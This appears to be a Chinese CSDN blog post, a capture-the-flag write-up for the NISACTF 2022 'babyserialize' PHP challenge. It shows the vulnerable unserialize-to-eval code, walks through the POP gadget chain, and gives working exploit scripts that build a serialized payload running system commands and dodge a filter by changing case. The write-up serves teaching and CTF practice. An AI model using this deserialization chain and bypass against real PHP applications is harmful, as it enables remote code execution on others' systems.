{"blogid": "124620719", "writerAge": "码龄1年", "writerBlogNum": "6", "writerCollect": "2", "writerComment": "0", "writerFan": "1", "writerGrade": "1级", "writerIntegral": "64", "writerName": "小秦同学呀", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124620719.jpg", "writerRankTotal": "142583", "writerRankWeekly": "1048839", "writerThumb": "3", "writerVisitNum": "2582", "blog_read_count": "991", "blog_time": "于 2022-05-06 23:11:05 发布", "blog_title": "关于[NISACTF 2022]babyserialize详解", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"_0\"></a>前言</h1>\n<p>先甩出PHP的魔术方法。</p>\n<pre><code>__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法\n__construst():具有构造函数的类在创建新对象的时候，回调此方法\n__destruct():反序列化的时候，或者对象销毁的时候调用\n__wakeup():反序列化的时候调用\n__sleep():序列化的时候调用\n__toString():把类当成字符串的时候调用，一般在echo处生效\n__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用\n__get():读取不可访问或者不存在的属性的时候，进行赋值\n__call():在对象中调用一个不可访问的方法的时候，会被执行\n</code></pre>\n<h1><a id=\"_13\"></a>题解</h1>\n<p>对于反序列化pop链进行分析的时候，我喜欢去进行反推处理，我感觉比正推容易很多，这里也是推荐给大家一个方法去进行反推。</p>\n<h2><a id=\"_15\"></a>代码</h2>\n<pre><code>&lt;?php\ninclude \"waf.php\";\nclass NISA{\n    public $fun=\"show_me_flag\";\n    public $txw4ever;\n    public function __wakeup()\n    {\n        if($this-&gt;fun==\"show_me_flag\"){\n            hint();\n        }\n    }\n\n    function __call($from,$val){\n        $this-&gt;fun=$val[0];\n    }\n\n    public function __toString()\n    {\n        echo $this-&gt;fun;\n        return \" \";\n    }\n    public function __invoke()\n    {\n        checkcheck($this-&gt;txw4ever);\n        @eval($this-&gt;txw4ever);\n    }\n}\n\nclass TianXiWei{\n    public $ext;\n    public $x;\n    public function __wakeup()\n    {\n        $this-&gt;ext-&gt;nisa($this-&gt;x);\n    }\n}\n\nclass Ilovetxw{\n    public $huang;\n    public $su;\n\n    public function __call($fun1,$arg){\n        $this-&gt;huang-&gt;fun=$arg[0];\n    }\n\n    public function __toString(){\n        $bb = $this-&gt;su;\n        return $bb();\n    }\n}\n\nclass four{\n    public $a=\"TXW4EVER\";\n    private $fun='abc';\n\n    public function __set($name, $value)\n    {\n        $this-&gt;$name=$value;\n        if ($this-&gt;fun = \"sixsixsix\"){\n            strtolower($this-&gt;a);\n        }\n    }\n}\n\nif(isset($_GET['ser'])){\n    @unserialize($_GET['ser']);\n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<h2><a id=\"_87\"></a>解题思路</h2>\n<h3><a id=\"1eval__invoke_88\"></a>（1）eval反推到__invoke</h3>\n<p>这里先看到eval，而eval中的变量可控，所以肯定是代码执行，而eval又在__invoke魔术方法中。</p>\n<pre><code>__invoke魔术方法是对象被当做函数进行调用的时候所触发\n</code></pre>\n<p>这里就反推看哪里用到了类似$a()这种的。</p>\n<h3><a id=\"2__invoke__toString_94\"></a>（2）__invoke反推到__toString</h3>\n<p>在Ilovetxw类的toString方法中，返回了return $bb;</p>\n<pre><code>__ToString方法，是对象被当做字符串的时候进行自动调用\n</code></pre>\n<h3><a id=\"3__toString__set_99\"></a>（3）__toString反推到__set</h3>\n<p>在four的__set中，调用了strolower方法。如果不清楚，可以具体看下文档。<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5ced797c0a0a4d4286d22d377a289422.png\"/>这里就可以存在把对象当做字符串进行操作。</p>\n<h3><a id=\"4__set__call_102\"></a>（4）从__set反推到__call</h3>\n<pre><code>__set:对不存在或者不可访问的变量进行赋值就自动调用\n__call:对不存在的方法或者不可访问的方法进行调用就自动调用\n</code></pre>\n<p>这里反推到Ilovetxw中的__call方法，而__call方法又可直接反推回pop链入口函数__wakeup</p>\n<h3><a id=\"_109\"></a>思路总结图解</h3>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8c2c991f93cf477d81bc248f9966c28f.png\"/></p>\n<h2><a id=\"exp_111\"></a>构造exp</h2>\n<pre><code>&lt;?php\nshow_source('2.php');\nclass NISA{\n    public $fun;\n    public $txw4ever='system(\"ls\");';\n}\n\nclass TianXiWei{\n    public $ext;\n    public $x;\n}\n\nclass Ilovetxw{\n    public $huang;\n    public $su;\n}\n\nclass four{\n    public $a;\n    private $fun;\n}\n$a=new tianxiwei;\n$a-&gt;ext=new ilovetxw;\n$a-&gt;ext-&gt;huang=new four;\n$a-&gt;ext-&gt;huang-&gt;a=new ilovetxw;\n$a-&gt;ext-&gt;huang-&gt;a-&gt;su=new nisa;\necho urlencode(serialize($a));\n</code></pre>\n<p>发现something wrong…<br/> 这里进行常规大小写转换，就可以绕过</p>\n<pre><code>&lt;?php\nshow_source('2.php');\nclass NISA{\n    public $fun;\n    public $txw4ever='System(\"tac /fllllllaaag\");';\n}\n\nclass TianXiWei{\n    public $ext;\n    public $x;\n}\n\nclass Ilovetxw{\n    public $huang;\n    public $su;\n}\n\nclass four{\n    public $a;\n    private $fun;\n}\n$a=new tianxiwei;\n$a-&gt;ext=new ilovetxw;\n$a-&gt;ext-&gt;huang=new four;\n$a-&gt;ext-&gt;huang-&gt;a=new ilovetxw;\n$a-&gt;ext-&gt;huang-&gt;a-&gt;su=new nisa;\necho urlencode(serialize($a));\n</code></pre>\n<p>就可以读到flag</p>\n<h1><a id=\"_174\"></a>总结</h1>\n<p>这道题还是对pop链的构造的一个深入了解，考了一个eval代码执行的小trick技巧，也是比较简单，总体来说，不太复杂，较为基础。</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-05-06 23:11:05", "summary": "前言先甩出的魔术方法。当尝试以调用函数的方式调用对象的时候，就会调用该方法具有构造函数的类在创建新对象的时候，回调此方法反序列化的时候，或者对象销毁的时候调用反序列化的时候调用序列化的时候调用把类当成"}